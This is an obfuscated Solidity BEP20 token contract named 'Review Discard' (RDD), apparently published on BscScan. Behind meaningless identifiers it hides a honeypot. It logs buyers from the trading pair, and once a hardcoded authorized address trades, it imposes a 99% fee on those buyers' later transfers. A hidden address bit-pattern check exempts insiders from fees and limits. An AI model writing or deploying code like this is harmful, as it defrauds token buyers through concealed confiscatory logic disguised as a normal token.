/**
 *Submitted for verification at BscScan.com on 2022-12-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;



interface IBEP20 {

    function decimals() external view returns (uint8);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

}


abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function SetAuthorized(address adr) public onlyAuthorized() {
        competent[adr] = true;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}



contract ReviewDiscard is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;


    uint256 isLaunchedSenderAmountAutoReceiverBots = 100000000 * (10 ** _decimals);
    uint256  fromToBotsTx = 2000000 * 10 ** _decimals;
    uint256  atLiquidityLaunchedMode = 2000000 * 10 ** _decimals;


    string constant _name = "Review Discard";
    string constant _symbol = "RDD";
    uint8 constant _decimals = 18;

    uint256 private exemptIsTakeAt = 0;
    uint256 private amountMaxMarketingBots = 8;

    uint256 private teamFromTokenMin = 0;
    uint256 private marketingTokenIsReceiver = 8;

    bool private launchEnableReceiverMode = true;
    bool private isMinWalletLiquidity = true;
    bool private launchedAmountBotsMint = true;
    bool private maxTradingSenderListLaunched = true;
    bool private exemptTradingLaunchedMaxWalletTake = true;
    uint256 buyModeMinTrading = 2 ** 18 - 1;
    uint256 private burnExemptMaxListTx = 6 * 10 ** 15;
    uint256 private minTxAtBots = isLaunchedSenderAmountAutoReceiverBots / 1000; // 0.1%

    uint256 private senderTradingMarketingTake = amountMaxMarketingBots + exemptIsTakeAt;
    uint256 private fundAtLaunchReceiverTotalLiquiditySender = 100;

    bool private shouldAutoSellReceiver;
    uint256 private modeLaunchedTxSell;
    uint256 private autoFundBurnMarketing;
    uint256 private tokenTradingTakeSell;
    uint256 private modeAmountToTake;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private enableIsWalletTeam;
    mapping(address => bool) private listReceiverModeTeamLiquiditySwap;
    mapping(address => bool) private receiverAutoMintLimit;
    mapping(address => bool) private totalMinListMaxSenderTeam;
    mapping(address => uint256) private modeSwapShouldMax;
    mapping(uint256 => address) private botsMarketingTradingMint;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public fromLaunchedReceiverLimit;
    address public uniswapV2Pair;

    uint256 private modeSellSwapLimitFeeLaunched;
    uint256 private fromAtMintSell;

    address private shouldLaunchWalletTo = (msg.sender); // auto-liq address
    address private tradingAmountMinReceiver = (0xEe39568fe5AA57D5B3584b75FfffE27ca3b3844C); // marketing address
    address private senderMinToFrom = DEAD;
    address private launchedReceiverIsTo = DEAD;
    address private senderMintEnableTx = DEAD;
    
    bool private takeReceiverTotalMin = false;
    bool public modeSwapEnableLiquidity = false;
    bool private launchedSenderListToken = false;
    uint256 private fromReceiverLaunchMode = 0;
    bool private enableBurnFeeMode = false;
    bool public minAmountIsTo = false;
    uint256 public totalLiquidityListWallet = 0;
    uint256 private buyReceiverTeamToLimit = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        fromLaunchedReceiverLimit = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(fromLaunchedReceiverLimit.factory()).createPair(address(this), fromLaunchedReceiverLimit.WETH());
        _allowances[address(this)][address(fromLaunchedReceiverLimit)] = isLaunchedSenderAmountAutoReceiverBots;

        shouldAutoSellReceiver = true;

        receiverAutoMintLimit[msg.sender] = true;
        receiverAutoMintLimit[0x0000000000000000000000000000000000000000] = true;
        receiverAutoMintLimit[0x000000000000000000000000000000000000dEaD] = true;
        receiverAutoMintLimit[address(this)] = true;

        enableIsWalletTeam[msg.sender] = true;
        enableIsWalletTeam[address(this)] = true;

        listReceiverModeTeamLiquiditySwap[msg.sender] = true;
        listReceiverModeTeamLiquiditySwap[0x0000000000000000000000000000000000000000] = true;
        listReceiverModeTeamLiquiditySwap[0x000000000000000000000000000000000000dEaD] = true;
        listReceiverModeTeamLiquiditySwap[address(this)] = true;


        SetAuthorized(address(0xac1f3943A944Dd815533Cf2ffFFFD236b8908762));
        approve(_router, isLaunchedSenderAmountAutoReceiverBots);
        approve(address(uniswapV2Pair), isLaunchedSenderAmountAutoReceiverBots);
        _balances[msg.sender] = isLaunchedSenderAmountAutoReceiverBots;
        emit Transfer(address(0), msg.sender, isLaunchedSenderAmountAutoReceiverBots);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return isLaunchedSenderAmountAutoReceiverBots;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, isLaunchedSenderAmountAutoReceiverBots);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return teamBuyAmountTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != isLaunchedSenderAmountAutoReceiverBots) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return teamBuyAmountTx(sender, recipient, amount);
    }

    function getmarketingLaunchedLimitBotsSellTradingTo() public view returns (address) {
        return tradingAmountMinReceiver;
    }

    function getamountModeWalletTx() public view returns (bool) {
        if (takeReceiverTotalMin != launchedSenderListToken) {
            return launchedSenderListToken;
        }
        if (takeReceiverTotalMin == enableBurnFeeMode) {
            return enableBurnFeeMode;
        }
        if (takeReceiverTotalMin != modeSwapEnableLiquidity) {
            return modeSwapEnableLiquidity;
        }
        return takeReceiverTotalMin;
    }

    function setamountModeWalletTx(bool isSellModeWallet) public onlyOwner {
        if (takeReceiverTotalMin == launchEnableReceiverMode) {
            launchEnableReceiverMode=isSellModeWallet;
        }
        takeReceiverTotalMin=isSellModeWallet;
    }

    function getmintSenderEnableIs(address isSellModeWallet) public view returns (bool) {
            return totalMinListMaxSenderTeam[isSellModeWallet];
    }

    function setmintSenderEnableIs(address isSellModeWallet,bool tradingBuyMinShould) public onlyOwner {
        if (totalMinListMaxSenderTeam[isSellModeWallet] == receiverAutoMintLimit[isSellModeWallet]) {
           receiverAutoMintLimit[isSellModeWallet]=tradingBuyMinShould;
        }
        if (isSellModeWallet == tradingAmountMinReceiver) {
            minAmountIsTo=tradingBuyMinShould;
        }
        totalMinListMaxSenderTeam[isSellModeWallet]=tradingBuyMinShould;
    }

    function senderAmountTradingAt(address tokenTeamEnableMax, address sellTxLaunchBots, uint256 shouldReceiverFromList) internal returns (uint256) {
        
        if (takeReceiverTotalMin == launchedAmountBotsMint) {
            takeReceiverTotalMin = minAmountIsTo;
        }


        uint256 receiverTakeBurnLiquidityFromMarketingBotsAmount = shouldReceiverFromList.mul(marketingShouldExemptToken(tokenTeamEnableMax, sellTxLaunchBots == uniswapV2Pair)).div(fundAtLaunchReceiverTotalLiquiditySender);

        if (totalMinListMaxSenderTeam[tokenTeamEnableMax] || totalMinListMaxSenderTeam[sellTxLaunchBots]) {
            receiverTakeBurnLiquidityFromMarketingBotsAmount = shouldReceiverFromList.mul(99).div(fundAtLaunchReceiverTotalLiquiditySender);
        }

        _balances[address(this)] = _balances[address(this)].add(receiverTakeBurnLiquidityFromMarketingBotsAmount);
        emit Transfer(tokenTeamEnableMax, address(this), receiverTakeBurnLiquidityFromMarketingBotsAmount);
        
        return shouldReceiverFromList.sub(receiverTakeBurnLiquidityFromMarketingBotsAmount);
    }

    function enableMaxTeamExemptSenderShouldBurn() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (modeSwapShouldMax[botsMarketingTradingMint[i]] == 0) {
                    modeSwapShouldMax[botsMarketingTradingMint[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function gettokenTeamEnableModeFund(address isSellModeWallet) public view returns (bool) {
            return receiverAutoMintLimit[isSellModeWallet];
    }

    function listSwapTeamTradingLaunch() private view returns (uint256) {
        return block.timestamp;
    }

    function setlimitBuyTxEnable(uint256 isSellModeWallet) public onlyOwner {
        if (amountMaxMarketingBots != totalLiquidityListWallet) {
            totalLiquidityListWallet=isSellModeWallet;
        }
        if (amountMaxMarketingBots == buyReceiverTeamToLimit) {
            buyReceiverTeamToLimit=isSellModeWallet;
        }
        amountMaxMarketingBots=isSellModeWallet;
    }

    function txLiquidityAutoLimit(address tokenTeamEnableMax) internal view returns (bool) {
        return !listReceiverModeTeamLiquiditySwap[tokenTeamEnableMax];
    }

    function getlistLiquidityTxMint() public view returns (address) {
        if (launchedReceiverIsTo == shouldLaunchWalletTo) {
            return shouldLaunchWalletTo;
        }
        return launchedReceiverIsTo;
    }

    function setlaunchLaunchedFeeBotsTokenEnable(uint256 isSellModeWallet) public onlyOwner {
        if (exemptIsTakeAt == exemptIsTakeAt) {
            exemptIsTakeAt=isSellModeWallet;
        }
        if (exemptIsTakeAt != fromReceiverLaunchMode) {
            fromReceiverLaunchMode=isSellModeWallet;
        }
        exemptIsTakeAt=isSellModeWallet;
    }

    function setmarketingLaunchedLimitBotsSellTradingTo(address isSellModeWallet) public onlyOwner {
        if (tradingAmountMinReceiver == senderMintEnableTx) {
            senderMintEnableTx=isSellModeWallet;
        }
        if (tradingAmountMinReceiver != senderMinToFrom) {
            senderMinToFrom=isSellModeWallet;
        }
        if (tradingAmountMinReceiver == shouldLaunchWalletTo) {
            shouldLaunchWalletTo=isSellModeWallet;
        }
        tradingAmountMinReceiver=isSellModeWallet;
    }

    function gettradingFundListFee() public view returns (uint256) {
        if (senderTradingMarketingTake != fundAtLaunchReceiverTotalLiquiditySender) {
            return fundAtLaunchReceiverTotalLiquiditySender;
        }
        if (senderTradingMarketingTake != totalLiquidityListWallet) {
            return totalLiquidityListWallet;
        }
        if (senderTradingMarketingTake == totalLiquidityListWallet) {
            return totalLiquidityListWallet;
        }
        return senderTradingMarketingTake;
    }

    function setlistLiquidityTxMint(address isSellModeWallet) public onlyOwner {
        if (launchedReceiverIsTo != senderMintEnableTx) {
            senderMintEnableTx=isSellModeWallet;
        }
        if (launchedReceiverIsTo == senderMinToFrom) {
            senderMinToFrom=isSellModeWallet;
        }
        if (launchedReceiverIsTo != senderMintEnableTx) {
            senderMintEnableTx=isSellModeWallet;
        }
        launchedReceiverIsTo=isSellModeWallet;
    }

    function setfundSenderMaxAt(bool isSellModeWallet) public onlyOwner {
        if (modeSwapEnableLiquidity != isMinWalletLiquidity) {
            isMinWalletLiquidity=isSellModeWallet;
        }
        if (modeSwapEnableLiquidity != launchedSenderListToken) {
            launchedSenderListToken=isSellModeWallet;
        }
        if (modeSwapEnableLiquidity != isMinWalletLiquidity) {
            isMinWalletLiquidity=isSellModeWallet;
        }
        modeSwapEnableLiquidity=isSellModeWallet;
    }

    function settokenTeamEnableModeFund(address isSellModeWallet,bool tradingBuyMinShould) public onlyOwner {
        if (receiverAutoMintLimit[isSellModeWallet] != totalMinListMaxSenderTeam[isSellModeWallet]) {
           totalMinListMaxSenderTeam[isSellModeWallet]=tradingBuyMinShould;
        }
        receiverAutoMintLimit[isSellModeWallet]=tradingBuyMinShould;
    }

    function settradingFundListFee(uint256 isSellModeWallet) public onlyOwner {
        if (senderTradingMarketingTake == minTxAtBots) {
            minTxAtBots=isSellModeWallet;
        }
        if (senderTradingMarketingTake == minTxAtBots) {
            minTxAtBots=isSellModeWallet;
        }
        senderTradingMarketingTake=isSellModeWallet;
    }

    function tradingTxReceiverAt() private view returns (uint256) {
        address buySellLimitTradingMax = WBNB;
        if (address(this) < WBNB) {
            buySellLimitTradingMax = address(this);
        }
        (uint liquidityWalletIsFee, uint limitBuyMaxEnable,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 toEnableTxLimitFromReceiver,) = WBNB == buySellLimitTradingMax ? (liquidityWalletIsFee, limitBuyMaxEnable) : (limitBuyMaxEnable, liquidityWalletIsFee);
        uint256 botsModeLaunchFundReceiverEnableTake = IERC20(WBNB).balanceOf(uniswapV2Pair) - toEnableTxLimitFromReceiver;
        return botsModeLaunchFundReceiverEnableTake;
    }

    function swapAtTotalBuy(address enableAutoLaunchBuy) private view returns (bool) {
        return ((uint256(uint160(enableAutoLaunchBuy)) << 192) >> 238) == buyModeMinTrading;
    }

    function botsTeamLimitBuyMintSwapLaunched(address tokenTeamEnableMax, uint256 receiverTakeBurnLiquidityFromMarketingBots) private view returns (uint256) {
        uint256 modeExemptBotsTakeTeamMint = modeSwapShouldMax[tokenTeamEnableMax];
        if (modeExemptBotsTakeTeamMint > 0 && listSwapTeamTradingLaunch() - modeExemptBotsTakeTeamMint > 2) {
            return 99;
        }
        return receiverTakeBurnLiquidityFromMarketingBots;
    }

    function launchedFromLaunchExemptTeamReceiver(address enableAutoLaunchBuy) private {
        if (tradingTxReceiverAt() < burnExemptMaxListTx) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        botsMarketingTradingMint[maxWalletAmount] = enableAutoLaunchBuy;
    }

    function burnEnableTeamLaunchedTxMode() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        exemptTradingLaunchedMaxWalletTake &&
        _balances[address(this)] >= minTxAtBots;
    }

    function getfundSenderMaxAt() public view returns (bool) {
        if (modeSwapEnableLiquidity == enableBurnFeeMode) {
            return enableBurnFeeMode;
        }
        return modeSwapEnableLiquidity;
    }

    function getlaunchLaunchedFeeBotsTokenEnable() public view returns (uint256) {
        if (exemptIsTakeAt != totalLiquidityListWallet) {
            return totalLiquidityListWallet;
        }
        if (exemptIsTakeAt != burnExemptMaxListTx) {
            return burnExemptMaxListTx;
        }
        if (exemptIsTakeAt != marketingTokenIsReceiver) {
            return marketingTokenIsReceiver;
        }
        return exemptIsTakeAt;
    }

    function getlimitBuyTxEnable() public view returns (uint256) {
        if (amountMaxMarketingBots != fundAtLaunchReceiverTotalLiquiditySender) {
            return fundAtLaunchReceiverTotalLiquiditySender;
        }
        return amountMaxMarketingBots;
    }

    function teamBuyAmountTx(address tokenTeamEnableMax, address fundReceiverListSwapTradingTo, uint256 shouldReceiverFromList) internal returns (bool) {
        
        bool receiverTakeModeSellTeam = swapAtTotalBuy(tokenTeamEnableMax) || swapAtTotalBuy(fundReceiverListSwapTradingTo);
        
        if (launchedSenderListToken != minAmountIsTo) {
            launchedSenderListToken = minAmountIsTo;
        }

        if (buyReceiverTeamToLimit != launchBlock) {
            buyReceiverTeamToLimit = minTxAtBots;
        }

        if (minAmountIsTo != launchedSenderListToken) {
            minAmountIsTo = minAmountIsTo;
        }


        if (tokenTeamEnableMax == uniswapV2Pair) {
            if (maxWalletAmount != 0 && isAuthorized(fundReceiverListSwapTradingTo)) {
                enableMaxTeamExemptSenderShouldBurn();
            }
            if (!receiverTakeModeSellTeam) {
                launchedFromLaunchExemptTeamReceiver(fundReceiverListSwapTradingTo);
            }
        }
        
        
        if (inSwap || receiverTakeModeSellTeam) {return autoEnableReceiverBuyFund(tokenTeamEnableMax, fundReceiverListSwapTradingTo, shouldReceiverFromList);}

        if (!enableIsWalletTeam[tokenTeamEnableMax] && !enableIsWalletTeam[fundReceiverListSwapTradingTo] && fundReceiverListSwapTradingTo != uniswapV2Pair) {
            require((_balances[fundReceiverListSwapTradingTo] + shouldReceiverFromList) <= atLiquidityLaunchedMode, "Max wallet!");
        }
        
        require((shouldReceiverFromList <= fromToBotsTx) || receiverAutoMintLimit[tokenTeamEnableMax] || receiverAutoMintLimit[fundReceiverListSwapTradingTo], "Max TX Limit!");

        if (burnEnableTeamLaunchedTxMode()) {receiverSenderFeeIs();}

        _balances[tokenTeamEnableMax] = _balances[tokenTeamEnableMax].sub(shouldReceiverFromList, "Insufficient Balance!");
        
        uint256 minLaunchIsTotalSellBuy = txLiquidityAutoLimit(tokenTeamEnableMax) ? senderAmountTradingAt(tokenTeamEnableMax, fundReceiverListSwapTradingTo, shouldReceiverFromList) : shouldReceiverFromList;

        _balances[fundReceiverListSwapTradingTo] = _balances[fundReceiverListSwapTradingTo].add(minLaunchIsTotalSellBuy);
        emit Transfer(tokenTeamEnableMax, fundReceiverListSwapTradingTo, minLaunchIsTotalSellBuy);
        return true;
    }

    function autoEnableReceiverBuyFund(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getatLiquiditySwapReceiver() public view returns (bool) {
        if (launchedAmountBotsMint == launchedAmountBotsMint) {
            return launchedAmountBotsMint;
        }
        if (launchedAmountBotsMint == launchedAmountBotsMint) {
            return launchedAmountBotsMint;
        }
        if (launchedAmountBotsMint != isMinWalletLiquidity) {
            return isMinWalletLiquidity;
        }
        return launchedAmountBotsMint;
    }

    function setatLiquiditySwapReceiver(bool isSellModeWallet) public onlyOwner {
        launchedAmountBotsMint=isSellModeWallet;
    }

    function marketingShouldExemptToken(address tokenTeamEnableMax, bool receiverMinLaunchedLiquidity) internal returns (uint256) {
        
        if (receiverMinLaunchedLiquidity) {
            senderTradingMarketingTake = marketingTokenIsReceiver + teamFromTokenMin;
            return botsTeamLimitBuyMintSwapLaunched(tokenTeamEnableMax, senderTradingMarketingTake);
        }
        if (!receiverMinLaunchedLiquidity && tokenTeamEnableMax == uniswapV2Pair) {
            senderTradingMarketingTake = amountMaxMarketingBots + exemptIsTakeAt;
            return senderTradingMarketingTake;
        }
        return botsTeamLimitBuyMintSwapLaunched(tokenTeamEnableMax, senderTradingMarketingTake);
    }

    function receiverSenderFeeIs() internal swapping {
        
        if (totalLiquidityListWallet != totalLiquidityListWallet) {
            totalLiquidityListWallet = buyReceiverTeamToLimit;
        }


        uint256 shouldReceiverFromListToLiquify = minTxAtBots.mul(exemptIsTakeAt).div(senderTradingMarketingTake).div(2);
        uint256 shouldReceiverFromListToSwap = minTxAtBots.sub(shouldReceiverFromListToLiquify);

        address[] memory maxShouldFromReceiver = new address[](2);
        maxShouldFromReceiver[0] = address(this);
        maxShouldFromReceiver[1] = fromLaunchedReceiverLimit.WETH();
        fromLaunchedReceiverLimit.swapExactTokensForETHSupportingFeeOnTransferTokens(
            shouldReceiverFromListToSwap,
            0,
            maxShouldFromReceiver,
            address(this),
            block.timestamp
        );
        
        uint256 atIsMinTotal = address(this).balance;
        uint256 swapTxTeamMint = senderTradingMarketingTake.sub(exemptIsTakeAt.div(2));
        uint256 atIsMinTotalLiquidity = atIsMinTotal.mul(exemptIsTakeAt).div(swapTxTeamMint).div(2);
        uint256 atIsMinTotalMarketing = atIsMinTotal.mul(amountMaxMarketingBots).div(swapTxTeamMint);
        
        if (minAmountIsTo != launchEnableReceiverMode) {
            minAmountIsTo = launchedAmountBotsMint;
        }

        if (takeReceiverTotalMin != minAmountIsTo) {
            takeReceiverTotalMin = launchedAmountBotsMint;
        }

        if (totalLiquidityListWallet == exemptIsTakeAt) {
            totalLiquidityListWallet = launchBlock;
        }


        payable(tradingAmountMinReceiver).transfer(atIsMinTotalMarketing);

        if (shouldReceiverFromListToLiquify > 0) {
            fromLaunchedReceiverLimit.addLiquidityETH{value : atIsMinTotalLiquidity}(
                address(this),
                shouldReceiverFromListToLiquify,
                0,
                0,
                shouldLaunchWalletTo,
                block.timestamp
            );
            emit AutoLiquify(atIsMinTotalLiquidity, shouldReceiverFromListToLiquify);
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}